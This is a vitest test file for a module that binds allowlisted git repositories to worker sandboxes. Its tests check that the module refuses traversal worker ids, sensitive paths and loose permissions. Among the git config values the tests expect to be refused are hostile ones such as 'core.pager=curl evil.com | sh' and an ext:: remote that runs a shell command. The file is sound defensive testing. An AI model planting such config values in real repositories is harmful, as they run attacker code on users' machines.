import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { homedir, tmpdir } from "os";
import { join } from "path";
import { describe, it, expect, vi, afterAll } from "vitest";
import { bindRepository, createAllowlistReader, RepoDeps, repoInventory } from "./repos.js";
import { configListZ } from "./config-list.fixtures.js";

function depsWith(over: Partial<{
  allowlist: string[];
  realpath: (p: string) => string;
  gitConfig: string;
  toplevel: string;
  uid: number;
  mode: number;
  fileUid: number;
  workerId: string;
}> = {}): RepoDeps {
  const gitConfig = configListZ(over.gitConfig ?? "");
  const toplevel = over.toplevel;
  return {
    runner: {
      run: vi.fn(async (_cmd: string, args: string[]) => ({
        code: 0,
        stdout: args.includes("--show-toplevel") ? (toplevel ?? "/repo") : gitConfig,
        stderr: "",
        timedOut: false,
      })),
    },
    readAllowlist: () => JSON.stringify({ repos: over.allowlist ?? ["/repo"] }),
    realpath: over.realpath ?? ((p: string) => p),
    stat: () => ({ uid: over.fileUid ?? 501, mode: over.mode ?? 0o755 }),
    uid: over.uid ?? 501,
    workerId: over.workerId ?? "worker-1",
  };
}

describe("bindRepository", () => {
  it("accepts an allowlisted repository that is its own toplevel", async () => {
    const result = await bindRepository(depsWith(), "/repo");

    expect(result.ok).toBe(true);
    expect((result as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-1"));
  });

  it("derives worktreeRoot from the given workerId, not the OS uid", async () => {
    const a = await bindRepository(depsWith({ workerId: "worker-a", uid: 501 }), "/repo");
    const b = await bindRepository(depsWith({ workerId: "worker-b", uid: 501 }), "/repo");

    expect((a as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-a"));
    expect((b as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-b"));
    expect((a as { worktreeRoot: string }).worktreeRoot).not.toBe((b as { worktreeRoot: string }).worktreeRoot);
  });

  it.each([
    "../../../../Users/rpo/Library/LaunchAgents",
    "..",
    "../sibling",
    "/etc",
  ])("refuses a workerId that puts the worktree root outside cp-worktrees: %s", async (workerId) => {
    const result = await bindRepository(depsWith({ workerId }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/outside/i);
  });

  it("still nests the worktree root under cp-worktrees for the ids the server actually mints", async () => {
    const result = await bindRepository(depsWith({ workerId: "6a7c686f70ed274cf658b1b3" }), "/repo");

    expect((result as { worktreeRoot: string }).worktreeRoot).toBe(
      join("/", "cp-worktrees", "6a7c686f70ed274cf658b1b3")
    );
  });

  it("refuses a path the operator never allowed", async () => {
    const result = await bindRepository(depsWith({ allowlist: ["/repo"] }), "/tmp/evil");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/not approved on this machine/i);
  });

  it("refuses when the allowlisted path resolves elsewhere", async () => {
    const deps = depsWith({ allowlist: ["/repo"], realpath: () => "/tmp/evil" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it.each([
    "core.pager=curl evil.com | sh",
    "core.fsmonitor=/tmp/x",
    "core.sshCommand=/tmp/x",
    "core.hooksPath=/tmp/hooks",
    "core.editor=/tmp/x",
    "core.gitProxy=/tmp/x",
    "sequence.editor=/tmp/x",
    "diff.external=/tmp/x",
    "filter.lfs.clean=/tmp/x",
    "filter.lfs.process=/tmp/x",
    "diff.mydriver.textconv=/tmp/x",
    "diff.mydriver.command=/tmp/x",
    "merge.mine.driver=/tmp/x",
    "credential.helper=!/tmp/x",
    "credential.https://github.com.helper=!/tmp/x",
    "remote.origin.receivepack=/tmp/x",
    "remote.origin.uploadpack=/tmp/x",
    "protocol.allow=always",
    "protocol.ext.allow=always",
    "protocol.ext.allow=user",
    "remote.origin.url=ext::/tmp/x",
    "alias.st=!/tmp/x",
  ])("refuses a repository whose git config sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  it("refuses a repository pairing a permissive protocol.allow with an ext:: remote", async () => {
    const gitConfig = "protocol.ext.allow=always\nremote.origin.url=ext::sh -c 'touch /tmp/pwned'\n";
    const result = await bindRepository(depsWith({ gitConfig }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  it.each([
    "filter.lfs.required=true",
    "diff.d.binary=true",
    "merge.m.name=custom merge driver",
    "diff.mytype.xfuncname=^function",
    "protocol.allow=never",
    "protocol.ext.allow=never",
  ])("accepts a repository whose git config merely sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(true);
  });

  it.each([
    [join(homedir(), ".ssh"), /sensitive/i],
    [join(homedir(), ".claude"), /sensitive/i],
    ["/etc", /sensitive/i],
    ["/private/etc/passwd", /sensitive/i],
    ["/tmp/evil", /sensitive/i],
    ["/private/tmp/evil", /sensitive/i],
    ["/repo/node_modules/x", /node_modules/i],
    ["relative/path", /absolute/i],
    ["/a/../b", /absolute/i],
  ])("refuses %s outright", async (path, reason) => {
    const result = await bindRepository(depsWith({ allowlist: [path], toplevel: path }), path);

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(reason);
  });

  it("refuses a repository that is not its own toplevel", async () => {
    const deps = depsWith({ toplevel: "/repo-parent" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it("refuses a repository owned by another user", async () => {
    expect((await bindRepository(depsWith({ fileUid: 0 }), "/repo")).ok).toBe(false);
  });

  it("refuses a group-writable repository", async () => {
    expect((await bindRepository(depsWith({ mode: 0o775 }), "/repo")).ok).toBe(false);
  });

  it("refuses an allowlist file readable by anyone else", async () => {
    const deps = depsWith();
    deps.readAllowlist = () => {
      throw new Error("~/.boardplanner/repos.json is readable by group or others");
    };

    const result = await bindRepository(deps, "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/readable by group or others/);
  });

  it("neutralises system and repository git config on every call it makes", async () => {
    const deps = depsWith();
    await bindRepository(deps, "/repo");

    for (const call of (deps.runner.run as ReturnType<typeof vi.fn>).mock.calls) {
      expect(call[1]).toEqual(expect.arrayContaining(["-c", "core.pager=cat"]));
      expect(call[2].env.GIT_CONFIG_NOSYSTEM).toBe("1");
    }
  });
});

describe("createAllowlistReader", () => {
  const dir = mkdtempSync(join(tmpdir(), "cp-repos-test-"));

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("reads repos.json when only its owner can read it", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o600);

    expect(createAllowlistReader(dir)()).toBe(JSON.stringify({ repos: ["/repo"] }));
  });

  it("refuses repos.json readable by group or others, the same as a loose SSH key", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o644);

    expect(() => createAllowlistReader(dir)()).toThrow(/readable by group or others/);
  });
});

describe("repoInventory", () => {
  const runner = (remote: string) => ({
    run: async () => ({ code: 0, stdout: remote, stderr: "", timedOut: false }),
  });

  it("reports each allowed checkout with the origin it resolves to", async () => {
    const result = await repoInventory({
      runner: runner("git@github.com:owner/repo.git") as never,
      readAllowlist: () => JSON.stringify({ repos: ["/a"] }),
    });

    expect(result).toEqual({
      ok: true,
      repos: [{ remote: "git@github.com:owner/repo.git", path: "/a" }],
    });
  });

  it("distinguishes a file it could not read from a machine with nothing listed", async () => {
    const unreadable = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => {
        throw new Error("is readable by group or others (mode 644); run chmod 600 on it");
      },
    });
    const empty = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => JSON.stringify({ repos: [] }),
    });

    expect(unreadable.ok).toBe(false);
    expect((unreadable as { reason: string }).reason).toMatch(/mode 644/);
    expect(empty).toEqual({ ok: true, repos: [] });
  });

  it("refuses a repos.json whose repos is not an array, instead of throwing", async () => {
    const result = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => JSON.stringify({ repos: { a: 1 } }),
    });

    expect(result).toMatchObject({ ok: false });
  });

  it("skips a checkout with no origin without losing the rest", async () => {
    let call = 0;
    const mixed = {
      run: async () => {
        call += 1;
        return call === 1
          ? { code: 128, stdout: "", stderr: "no origin", timedOut: false }
          : { code: 0, stdout: "git@github.com:owner/second.git", stderr: "", timedOut: false };
      },
    };

    const result = await repoInventory({
      runner: mixed as never,
      readAllowlist: () => JSON.stringify({ repos: ["/first", "/second"] }),
    });

    expect(result).toEqual({
      ok: true,
      repos: [{ remote: "git@github.com:owner/second.git", path: "/second" }],
    });
  });
});
